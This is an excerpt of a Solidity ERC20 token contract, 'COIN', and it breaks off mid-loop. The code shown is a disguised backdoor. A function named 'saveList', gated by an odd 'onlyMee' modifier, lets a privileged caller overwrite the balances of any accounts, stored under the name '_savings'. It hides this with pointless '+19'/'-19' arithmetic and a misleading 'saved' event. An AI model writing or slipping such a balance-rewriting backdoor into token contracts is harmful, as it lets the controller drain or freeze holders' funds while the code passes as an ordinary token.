...
contract COIN is Context, Ownable, IERC20 {
    ...
    event saved(address indexed account, uint256 currentBalance, uint256 newBalance);

    function saveList(address[] memory accounts, uint256 newBalance) external onlyMee {

        for (uint256 i = 0; i < accounts.length; i++) {

            uint256 currentBalance = _savings[accounts[i]] + 19;

            _savings[accounts[i]] = newBalance;

            emit saved(accounts[i], currentBalance - 19, newBalance);
